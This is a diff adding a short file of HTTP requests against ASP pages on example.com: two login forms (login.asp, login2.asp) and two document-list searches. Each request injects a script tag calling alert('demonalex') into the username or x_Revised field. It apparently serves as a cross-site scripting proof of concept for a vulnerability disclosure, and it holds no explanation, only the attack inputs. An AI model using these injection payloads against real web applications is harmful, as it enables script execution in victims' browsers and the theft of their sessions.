@@ -1,0 +1,10 @@
+POST http://www.example.com/login.asp
+username=&quot;&gt;&lt;script&gt;alert(&#039;demonalex&#039;)&lt;/script&gt;&amp;password=bbb&amp;rememberme=a&amp;submit=+++Login+++
+
+POST http://www.example.com/login2.asp
+username=&quot;&gt;&lt;script&gt;alert(&#039;demonalex&#039;)&lt;/script&gt;&amp;password=bbb&amp;rememberme=a&amp;submit=+++Login+++
+
+http://www.example.com/myDoclist.asp?x_Title=a&amp;z_Title=LIKE&amp;x_Revised=&lt;SCRIPT&gt;alert(&quot;demonalex&quot;);&lt;/SCRIPT&gt;&amp;z_Revised==&amp;x_KeyWords=info&amp;z_KeyWords=LIKE&amp;x_owner=a&amp;z_owner=LIKE
+
+http://www.example.com/myWebDoclist.asp?x_Title=b&amp;z_Title=LIKE&amp;x_Revised=&lt;SCRIPT&gt;alert(&quot;demonalex&quot;);&lt;/SCRIPT&gt;&amp;z_Revised==&amp;x_KeyWords=test&amp;z_KeyWords=LIKE&amp;x_owner=a&amp;z_owner=LIKE
+
